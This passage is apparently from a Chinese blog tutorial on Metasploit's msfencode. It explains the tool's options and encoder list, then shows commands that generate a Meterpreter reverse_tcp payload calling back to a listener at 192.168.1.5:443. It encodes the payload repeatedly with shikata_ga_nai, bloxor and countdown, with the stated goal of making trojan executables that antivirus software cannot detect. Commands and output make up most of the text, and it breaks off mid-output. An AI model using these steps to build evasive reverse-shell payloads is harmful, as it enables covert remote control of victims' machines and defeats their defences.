&nbsp;&nbsp;&nbsp;&nbsp;-m&nbsp;&nbsp;&nbsp;Specifies&nbsp;an&nbsp;additional&nbsp;module&nbsp;search&nbsp;path
&nbsp;&nbsp;&nbsp;&nbsp;-n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dump&nbsp;encoder&nbsp;information
&nbsp;&nbsp;&nbsp;&nbsp;-o&nbsp;&nbsp;&nbsp;The&nbsp;output&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;-p&nbsp;&nbsp;&nbsp;The&nbsp;platform&nbsp;to&nbsp;encode&nbsp;for
&nbsp;&nbsp;&nbsp;&nbsp;-s&nbsp;&nbsp;&nbsp;The&nbsp;maximum&nbsp;size&nbsp;of&nbsp;the&nbsp;encoded&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;-t&nbsp;&nbsp;&nbsp;The&nbsp;output&nbsp;format:&nbsp;
bash,c,csharp,dw,dword,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,vba,vba-exe,vbs,war
&nbsp;&nbsp;&nbsp;&nbsp;-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Increase&nbsp;verbosity
&nbsp;&nbsp;&nbsp;&nbsp;-x&nbsp;&nbsp;&nbsp;Specify&nbsp;an&nbsp;alternate&nbsp;executable&nbsp;template</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里我们就其参数做一一介绍：</span></p><pre class="brush:bash;toolbar:false">-a&nbsp;指定CPU&nbsp;的类型，-b&nbsp;指定需要去除的字符，帮助中的示例00&nbsp;ff&nbsp;这两种数值在网络传送中会被截断造成传送失败-c&nbsp;指定编码次数，-d&nbsp;指定exe模板搜索路径，-i&nbsp;指定要编码的数据文件-k&nbsp;设置生成的文件运行后的payload进程与模板文件进程分离。-l&nbsp;列出可用payload-n&nbsp;输出编码器信息-o&nbsp;输出文件-p&nbsp;指定编码平台
-s&nbsp;指定编码后的字节数（payload的）
-t&nbsp;
加密后文件的输出格式，支持以下格式：bash，c，c#,dword,java,js_be,js_le,数字型(num),perl文件，pl后缀文
件，powershell格式文件，ps1格式文
件，py,python,raw,rb,ruby,sh,vbapplaction,vbscript,asp,aspx,aspx-
exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small.loop-vbs.macho,msi,msi_nouac,osx-app,psh,psh-net,psh-reflection,vba,vba-exe,war
-v&nbsp;显示当前msfencode的版本信息
－x&nbsp;&nbsp;指定一个备用的可执行文件模版</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">msfencode可以对我们的payload进行加密，一般是和msfpayload配合使用，当然，也可以单独对已有的文件模版进行加密，支持多种文件格式，并且支持多种加密方式，这里我们先看看msfencode支持哪些类型的加密方式</span></p><p></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfencode&nbsp;-l[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
Framework&nbsp;Encoders==================
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;&nbsp;cmd/echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Echo&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;cmd/generic_sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generic&nbsp;Shell&nbsp;Variable&nbsp;Substitution&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;cmd/ifs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Generic&nbsp;${IFS}&nbsp;Substitution&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;cmd/perl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Perl&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;cmd/powershell_base64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;excellent&nbsp;&nbsp;Powershell&nbsp;Base64&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;cmd/printf_php_mq&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(1)&nbsp;via&nbsp;PHP&nbsp;magic_quotes&nbsp;Utility&nbsp;Command&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;generic/eicar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;EICAR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;generic/none&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;&quot;none&quot;&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;mipsbe/byte_xori&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Byte&nbsp;XORi&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;mipsbe/longxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;mipsle/byte_xori&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Byte&nbsp;XORi&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;mipsle/longxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;php/base64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;great&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHP&nbsp;Base64&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;ppc/longxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PPC&nbsp;LongXOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;ppc/longxor_tag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PPC&nbsp;LongXOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;sparc/longxor_tag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SPARC&nbsp;DWORD&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x64/xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/add_sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Add/Sub&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/alpha_mixed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alpha2&nbsp;Alphanumeric&nbsp;Mixedcase&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/alpha_upper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alpha2&nbsp;Alphanumeric&nbsp;Uppercase&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/avoid_underscore_tolower&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Avoid&nbsp;underscore/tolower
&nbsp;&nbsp;&nbsp;&nbsp;x86/avoid_utf8_tolower&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Avoid&nbsp;UTF8/tolower
&nbsp;&nbsp;&nbsp;&nbsp;x86/bloxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BloXor&nbsp;-&nbsp;A&nbsp;Metamorphic&nbsp;Block&nbsp;Based&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/call4_dword_xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Call+4&nbsp;Dword&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/context_cpuid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPUID-based&nbsp;Context&nbsp;Keyed&nbsp;Payload&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/context_stat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stat(2)-based&nbsp;Context&nbsp;Keyed&nbsp;Payload&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/context_time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time(2)-based&nbsp;Context&nbsp;Keyed&nbsp;Payload&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/countdown&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Single-byte&nbsp;XOR&nbsp;Countdown&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/fnstenv_mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Variable-length&nbsp;Fnstenv/mov&nbsp;Dword&nbsp;XOR&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/jmp_call_additive&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;normal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Jump/Call&nbsp;XOR&nbsp;Additive&nbsp;Feedback&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/nonalpha&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Non-Alpha&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/nonupper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Non-Upper&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/opt_sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sub&nbsp;Encoder&nbsp;(optimised)
&nbsp;&nbsp;&nbsp;&nbsp;x86/shikata_ga_nai&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;excellent&nbsp;&nbsp;Polymorphic&nbsp;XOR&nbsp;Additive&nbsp;Feedback&nbsp;Encoder
&nbsp;&nbsp;&nbsp;&nbsp;x86/single_static_bit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Single&nbsp;Static&nbsp;Bit
&nbsp;&nbsp;&nbsp;&nbsp;x86/unicode_mixed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Alpha2&nbsp;Alphanumeric&nbsp;Unicode
&nbsp;Mixedcase&nbsp;Encoder&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86/unicode_upper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Alpha2&nbsp;Alphanumeric&nbsp;Unicode&nbsp;Uppercase&nbsp;Encoder</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">上面列出了可以用的加密格式和等级，还是要根据我们系统的安全级别，杀毒软件以及其他防护软件来选择我们合适的加密方式以便绕过这些限制措施。空谈误国，我们还是看看实际的操作。<br/>首先，在我的本地有个a.exe，是我们其他工具生成的木马服务端，由于需要免杀，有没有专门做免杀的程序狗和逆向狗，没事，自己动手丰衣足食，用msfencode来解决你的困扰。</span><br/></p><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">我们用msfpayload来生成一个反弹的程序，通过msfencode来进行加密，规避杀毒软件的查杀。<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;&nbsp;msfpayload&nbsp;
windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.5&nbsp;LPORT=443&nbsp;R&nbsp;|&nbsp;
msfencode&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-c&nbsp;7&nbsp;-t&nbsp;exe&nbsp;-o&nbsp;payload.exe[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;308&nbsp;(iteration=1)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;335&nbsp;(iteration=2)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;362&nbsp;(iteration=3)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;389&nbsp;(iteration=4)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;416&nbsp;(iteration=5)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;443&nbsp;(iteration=6)
[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;470&nbsp;(iteration=7)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">当然，这里只用了一种加密方式，经过了7次加密，也可以采用多种加密方式的多重加密，这样大部分的杀毒软件都变哑巴了</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;
windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.5&nbsp;LPORT=443&nbsp;R&nbsp;|&nbsp;
msfencode&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-c&nbsp;7&nbsp;-t&nbsp;raw&nbsp;|&nbsp;msfencode&nbsp;-e&nbsp;x86/bloxor&nbsp;-c
&nbsp;3&nbsp;-t&nbsp;raw&nbsp;|&nbsp;msfencode&nbsp;-e&nbsp;x86/countdown&nbsp;-c&nbsp;5&nbsp;-t&nbsp;exe&nbsp;-o&nbsp;av.exe[!]&nbsp;
************************************************************************[!]
&nbsp;
************************************************************************[!]
&nbsp;
************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!